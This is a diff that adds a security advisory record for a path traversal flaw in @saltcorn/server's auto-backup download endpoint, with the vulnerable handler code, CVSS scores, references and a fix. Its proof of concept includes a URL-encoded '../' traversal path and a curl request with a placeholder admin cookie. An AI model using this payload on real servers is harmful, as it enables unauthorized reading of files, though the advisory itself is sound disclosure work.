@@ -1,0 +1,59 @@
+advisory_id: GHSA-277h-px4m-62q8
+datasource_id: github_osv_importer_v2/GHSA-277h-px4m-62q8
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/10/GHSA-277h-px4m-62q8/GHSA-277h-px4m-62q8.json
+aliases: []
+summary: "@saltcorn/server arbitrary file zip read and download when downloading auto backups\n\
+  ### Summary\n\nA user with admin permission can read and download arbitrary zip files when\
+  \ downloading auto backups. The file name used to identify the zip file is not properly sanitized\
+  \ when passed to `res.download` API.\n\n### Details\n\n- file: https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/admin.js#L671-L682\n\
+  \n```js\nrouter.get(\n  \"/auto-backup-download/:filename\",\n  isAdmin,\n  error_catcher(async\
+  \ (req, res) => {\n    const { filename } = req.params; // [1] source\n    [...]\n    if (\n\
+  \      !isRoot ||\n      !(filename.startsWith(backup_file_prefix) && filename.endsWith(\"\
+  .zip\")) // [2]\n    ) {\n      res.redirect(\"/admin/backup\");\n      return;\n    }\n \
+  \   const auto_backup_directory = getState().getConfig(\"auto_backup_directory\");\n    res.download(path.join(auto_backup_directory,\
+  \ filename), filename); // [3] sink\n  })\n);\n```\n\n### Steps to reproduce (PoC)\n\n- create\
+  \ a file with `.zip` extension under `/tmp` folder:\n```\necho \"secret12345\" > /tmp/secret.zip\n\
+  ```\n- log into the application as an admin user\n- visit the url   `http://localhost:3000/admin/auto-backup-download/sc-backup-%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2ftmp%2fsecret.zip`\n\
+  - download the zip file and then check if the zip was indeed downloaded:\n```bash\ncat secret.zip\n\
+  secret12345\n```\n\n \n- Alternatively send the following request to retrieve the file just\
+  \ created.\n```bash\ncurl -i -X $'GET' \\\n    -H $'Host: localhost:3000' \\\n    -H $'Connection:\
+  \ close' \\\n    -b $'connect.sid=VALID_CONNECT_SID_COOKIE' \\\n    $'http://localhost:3000/admin/auto-backup-download/sc-backup-%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2ftmp%2fsecret.zip'\n\
+  ```\n\n**NOTE**:\nTo obtain a valid `connect.sid` cookie, just open the developer console\
+  \ while logged and retrieve the cookie value.\n\n### Impact\n\nArbitrary zip files download\
+  \ (information disclosure).\n\n### Recommended Mitigation\n\nResolve the `filename` parameter\
+  \ before checking if it starts with `backup_file_prefix` ."
+impacted_packages:
+  - purl: pkg:npm/%40saltcorn/server
+    affected_versions: vers:npm/<=1.0.0-beta.13
+    fixed_versions: vers:npm/1.0.0-beta.14
+severities:
+  - score: '4.4'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:N
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/10/GHSA-277h-px4m-62q8/GHSA-277h-px4m-62q8.json
+  - score: '5.0'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:P/PR:H/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:P
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/10/GHSA-277h-px4m-62q8/GHSA-277h-px4m-62q8.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-22
+references:
+  - url: https://github.com/saltcorn/saltcorn
+    reference_type:
+    reference_id:
+  - url: https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/admin.js#L671-L682
+    reference_type:
+    reference_id:
+  - url: https://github.com/saltcorn/saltcorn/commit/024f19a7e079913f62f4a2335ab04116ddb68192
+    reference_type:
+    reference_id:
+  - url: https://github.com/saltcorn/saltcorn/security/advisories/GHSA-277h-px4m-62q8
+    reference_type:
+    reference_id:
